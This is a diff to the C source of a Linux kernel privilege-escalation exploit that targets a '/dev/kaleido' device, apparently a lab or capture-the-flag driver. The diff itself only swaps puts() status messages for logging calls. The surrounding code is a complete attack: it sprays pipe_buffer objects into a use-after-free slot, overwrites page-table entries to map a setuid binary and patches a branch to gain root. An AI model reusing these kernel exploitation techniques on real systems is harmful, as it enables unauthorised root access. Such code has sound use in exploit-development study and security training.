@@ -28,7 +28,7 @@ struct request {
 i32 fd;
 
 int main(void) {
-    puts("[ ] exploit start");
+    log_info("exploit start");
 
     bool *parent_exploited =
         mmap(NULL, sizeof(bool), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
@@ -46,7 +46,7 @@ int main(void) {
         exit(0);
     }
 
-    puts("[ ] pre-allocating pipes");
+    log_info("pre-allocating pipes");
     i32 pipefd[NUM_PIPE_SPRAY][2];
     for (u32 i = 0; i < NUM_PIPE_SPRAY; i++) {
         CHECK(pipe(pipefd[i]));
@@ -54,7 +54,7 @@ int main(void) {
         CHECK(write(pipefd[i][1], "dead", 4));
     }
 
-    puts("[ ] pre-allocating PGD, PUD, and PMD");
+    log_info("pre-allocating PGD, PUD, and PMD");
     void *ptr[NUM_PTE_SPRAY];
     for (u32 i = 0; i < NUM_PTE_SPRAY; i++) {
         ptr[i] =
@@ -68,26 +68,26 @@ int main(void) {
 
     fd = CHECK(open("/dev/kaleido", O_RDWR));
 
-    puts("[ ] spraying struct pipe_buffer at kmalloc-2k");
+    log_info("spraying struct pipe_buffer at kmalloc-2k");
     for (u32 i = 0; i < NUM_PIPE_SPRAY / 2; i++) {
         CHECK(fcntl(pipefd[i][1], F_SETPIPE_SZ, 0x1000 * 32));  // 0x28 * 32 = 0x500
     }
 
-    puts("[+] UAF ready");
+    log_success("UAF ready");
     kaleido_alloc((void *)0xdeadbeef);
 
-    puts("[+] overlapping struct pipe_buffer to the victim object");
+    log_success("overlapping struct pipe_buffer to the victim object");
     for (u32 i = NUM_PIPE_SPRAY / 2; i < NUM_PIPE_SPRAY; i++) {
         CHECK(fcntl(pipefd[i][1], F_SETPIPE_SZ, 0x1000 * 32));
     }
 
-    puts("[+] overwriting pipe->bufs[0].page LSB");
+    log_success("overwriting pipe->bufs[0].page LSB");
     char buf[0x500];
     CHECK(kaleido_read(0, buf));
     buf[0] = '\0';
     CHECK(kaleido_write(0, buf));
 
-    puts("[ ] finding the victim pipe_buffer");
+    log_info("finding the victim pipe_buffer");
     i32 victim[2] = {0};
     i32 culprit[2] = {0};
     for (u32 i = 0; i < NUM_PIPE_SPRAY; i++) {
@@ -101,16 +101,16 @@ int main(void) {
             goto found_victim;
         }
     }
-    puts("[-] unable to find victim pipe_buffer");
+    log_error("unable to find victim pipe_buffer");
     return 0;
 
 found_victim:
-    puts("[+] found the victim pipe_buffer");
-    puts("[ ] freeing the pipe_buffer by closing the culprit pipefd");
+    log_success("found the victim pipe_buffer");
+    log_info("freeing the pipe_buffer by closing the culprit pipefd");
     CHECK(close(culprit[0]));
     CHECK(close(culprit[1]));
 
-    puts("[+] overlapping PTE to the freed page");
+    log_success("overlapping PTE to the freed page");
     for (u32 i = 1; i < NUM_PTE_SPRAY; i++) {
         *(char *)ptr[i] = 0;
     }
@@ -123,10 +123,10 @@ found_victim:
         pte[i] = phys_page_to_pte(page_setuid);
     }
 
-    puts("[+] overwriting PTE");
+    log_success("overwriting PTE");
     CHECK(write(victim[1], pte, 0x1ff * 0x8));
 
-    puts("[ ] finding setuid");
+    log_info("finding setuid");
     char *addr;
     for (u32 i = 1; i < NUM_PTE_SPRAY; i++) {
         for (u32 j = 1; j < 0x200; j++) {
@@ -138,17 +138,17 @@ found_victim:
             }
         }
     }
-    puts("[-] unable to find setuid");
+    log_error("unable to find setuid");
     return 0;
 
 found_setuid:
-    puts("[+] found setuid");
-    puts("[+] switching branch condition");
+    log_success("found setuid");
+    log_success("switching branch condition");
     addr[72] = 0x75;  // je -> jne
     *parent_exploited = true;
     pause();
 
-    puts("[-] exploit failed...");
+    log_error("exploit failed...");
     return 0;
 }
 
